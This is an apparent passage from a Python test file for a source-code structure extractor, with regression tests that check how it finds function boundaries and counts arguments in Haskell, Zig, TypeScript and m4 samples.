    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "inlineListToIdentifier exts =\n"
        "  textToIdentifier exts . stringify . unEmojify\n"
        "  where\n"
        "    unEmojify :: [Inline] -> [Inline]\n"
        "    unEmojify\n"
        "      | extensionEnabled Ext_gfm_auto_identifiers exts ||\n"
        "        extensionEnabled Ext_ascii_identifiers exts = walk unEmoji\n"
        "      | otherwise = id\n"
    )
    detector = StructuralExtractor("haskell", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    names = [fn["name"] for fn in result.get("functions", [])]
    assert "extensionEnabled" not in names, f"guard continuation misread as a function: {names}"
    assert "unEmojify" in names


def test_count_haskell_type_arrows_helper():
    """
    Direct unit coverage for `_count_haskell_type_arrows`, the Haskell
    curried-arity counter (#1209): counts top-level "->" occurrences after
    skipping any typeclass-constraint clause, ignoring an arrow nested
    inside a higher-order parameter's own parenthesized function type.
    """
    detector = StructuralExtractor("haskell", {"haskell": {"rules": {}}})
    cases = [
        ("IO ()", 0),
        ("Int -> Int -> Int", 2),
        ("Show a => a -> String", 1),
        ("(Int -> Int) -> Int -> Int", 2),
    ]
    for args_str, expected in cases:
        actual = detector._count_haskell_type_arrows(args_str)
        assert actual == expected, f"_count_haskell_type_arrows({args_str!r}) == {actual}, expected {expected}"


def test_detector_zig_single_quote_bound_prevents_cross_line_swallow():
    """
    Regression test for issue #1426: zig's char literals ('a', '\\n',
    '\\u{1F600}') are short-lived like rust's, but _build_brace_safe_stream's
    single-quote pattern used to be unbounded for zig. A real contraction/
    possessive apostrophe in prose (e.g. inside a zig `\\\\`-prefixed
    multi-line string literal, never shielded at all) reached that unbounded
    pattern as an unpaired `'`, which then greedily searched forward for the
    NEXT unrelated `'` -- blanking every real `{`/`}` in between, including a
    real function's own opening brace. That single swallowed `{` desyncs the
    brace-depth counter for the rest of the file: whichever function's body
    search was already in flight never finds its real closing brace and
    swallows everything until some later, unrelated `}` happens to
    rebalance the count. Confirmed on this exact corpus shape
    (language-crucible's zig/main.zig): a `wasi_cwd`-shaped function ahead
    of the apostrophe swallowed the rest of the file, hiding every function
    after it (`ZigClang_main` and friends included).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "fn wasi_cwd() void {\n"
        "    doStuff();\n"
        "}\n"
        "\n"
        'const usage = "" ++\n'
        "    \\\\  detect-cpu   Compare Zig's CPU feature detection\n"
        "    \\\\  llvm-ints    Dump a list of things\n"
        ";\n"
        "\n"
        "pub fn log(\n"
        "    comptime level: u8,\n"
        ") void {\n"
        "    doLogging();\n"
        "}\n"
        "\n"
        "extern fn ZigClang_main(argc: c_int) c_int;\n"
    )
    detector = StructuralExtractor("zig", LANGUAGE_DEFINITIONS)
    rules = LANGUAGE_DEFINITIONS["zig"]["rules"]
    satellites, _ = detector._slice_by_braces(code, "zig", rules, 0, {})
    names = [s["name"] for s in satellites]
    assert "wasi_cwd" in names, f"wasi_cwd's own body should stay bounded to itself: {names}"
    assert "log" in names, f"log must not be swallowed by wasi_cwd's body: {names}"
    wasi_cwd = next(s for s in satellites if s["name"] == "wasi_cwd")
    assert wasi_cwd["loc"] <= 3, f"wasi_cwd's body must not swallow the rest of the file: loc={wasi_cwd['loc']}"


def test_detector_depth_aware_brace_idx():
    """
    Proves that a brace inside a parameter list does not prematurely end the signature
    scan and cause argument count truncation for TypeScript.
    """
    opt = StructuralExtractor("typescript", MOCK_LANG_DEFS)
    # Give the mock some TS rules
    opt.languages["typescript"]["rules"]["func_start"] = re.compile(
        r"^[ \t]*(?:function\s+)?([a-zA-Z_$][\w$]*)\s*\((?:[^()]|\((?:[^()]|\([^()]*\))*\))*\)\s*\{", re.M
    )
    opt.languages["typescript"]["rules"]["args"] = re.compile(
        r"([a-zA-Z_$][\w$]*)\s*(\((?:[^()]|\((?:[^()]|\([^()]*\))*\))*\))"
    )
    code = "function test_func(options: { url: string, cb: () => void }) {\n    return 1;\n}\n"
    res = opt.splice(code, "")
    assert len(res["functions"]) == 1
    # Without depth-aware brace_idx, the brace inside the options object would truncate the signature
    # causing args_pattern to fail. With it, it should correctly identify 1 arg.
    assert res["functions"][0]["args_count"] == 1


def test_detector_nested_parens_in_args():
    """
    Proves that the top level argument counting correctly tracks braces and brackets
    to prevent commas inside object literals from artificially inflating the argument count.
    """
    opt = StructuralExtractor("typescript", MOCK_LANG_DEFS)
    # The _count_top_level_args handles splitting.
    # An argument `options: { a: string, b: string }` should be counted as 1 argument, not 2.
    assert opt._count_top_level_args("(options: { a: string, b: string }, cb: (x, y) => void)") == 2
    assert opt._count_top_level_args("(arr: [1, 2, 3], nested: { x: [1, 2] })") == 2


def test_detector_nested_functions_in_signature_dropped():
    """
    Proves that the signature_end logic correctly skips nested functions
    (like f: (a: A) => B inside flatMap's signature) rather than treating them as top-level.
    """
    opt = StructuralExtractor("typescript", MOCK_LANG_DEFS)
    opt.languages["typescript"]["rules"]["func_start"] = re.compile(
        r"^[ \t]*([a-zA-Z_$][\w$]*)(?=[ \t\n]*:[ \t\n]*(?:<(?:[^<>]|<[^<>]*>)*>\s*)?(?:\((?:[^()]|\([^()]*\))*\)[^=;{]*=>|[a-zA-Z_$][\w$]*[ \t\n]*=>))",
        re.M,
    )
    opt.languages["typescript"]["rules"]["args"] = re.compile(r"")

    code = (
        "export const flatMap: {\n"
        "  <A, E2, B>(f: (a: A) => Either<E2, B>): <E1>(ma: Either<E1, A>) => Either<E1 | E2, B>\n"
        "} = dual\n"
    )
    # The regex would match `f` as a func_start, but the signature_end logic in `_slice_by_braces`
    # should prevent it from being extracted as a real satellite function.
    satellites, _ = opt._slice_by_braces(code, "typescript", opt.languages["typescript"]["rules"], 0, {})
    assert len(satellites) == 0, "Nested parameter function `f` should have been skipped by signature_end logic!"


def test_detector_m4_bracket_slicing_with_unbalanced_quotes():
    """
    Issue #2204: m4 macro bodies are bounded by `(` and `)`, but they can contain
    shell fragments with unbalanced quotes (e.g. `"` and `'`) that break Mode B's
    string shielding. They also use `[` and `]` to quote strings (which protects
    internal parentheses). The custom `_slice_by_m4_brackets` mode handles this.
    """
    from gitgalaxy.core.detector import StructuralExtractor
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = """
AC_DEFUN([AC_PROG_F77], [])

AC_DEFUN([MY_MACRO], [
    if test "$foo" = "bar("; then
        echo "unbalanced quote here -> '"
    fi
    # [ ( nested bracket paren ignored ) ]
])

AC_DEFUN([ANOTHER],
[
    echo "done"
])
"""
    extractor = StructuralExtractor("m4", LANGUAGE_DEFINITIONS)
    rules = LANGUAGE_DEFINITIONS["m4"]["rules"]

    sats, _ = extractor._slice_by_m4_brackets(code, rules, 0, {})

    assert len(sats) == 3

    # Check names
    assert sats[0]["name"] == "AC_PROG_F77"
    assert sats[1]["name"] == "MY_MACRO"
    assert sats[2]["name"] == "ANOTHER"

    # Check exact lengths
    assert sats[0]["loc"] == 1
    assert sats[1]["loc"] == 6
    assert sats[2]["loc"] == 4
